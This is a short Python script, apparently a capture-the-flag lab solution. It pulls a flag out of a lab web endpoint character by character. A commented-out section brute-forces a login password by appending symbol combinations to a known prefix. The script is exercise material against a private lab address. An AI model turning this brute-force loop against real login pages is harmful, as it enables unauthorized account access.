#!/usr/bin/python3

import requests
import itertools
from bs4 import BeautifulSoup

url = 'http://192.168.171.68:8080/bijection/'

proxies = { "http": "127.0.0.1:8080" }

index = 0
flag = ""

while True:

    info = {'index': index}

    post = requests.post(url, data=info, proxies=proxies)

    tag = "</br>"

    response = post.text

    soup = BeautifulSoup(response, features="html.parser")
    div_tag = soup.find('div', class_='container')

    flag += div_tag.text.strip()

    if div_tag.text.strip() == "}":
        print("Flag: " + flag)
        break

    index += 1

''' Exercise Brute Force
my_list = "!@#%&"

combinations = list(itertools.product(my_list, repeat=5))

# print(combinations)

for combination in combinations:
    word = ''.join(combination)
    
    password = "discourse" + word
    print("Testando senha: " + password)

    info = {'username': 'rdescartes', 'password': password}

    post = requests.post(url, data=info, proxies=proxies)

    if "OS{" in post.text:
        print("Password found: " + word)
        break

print(post.text)

'''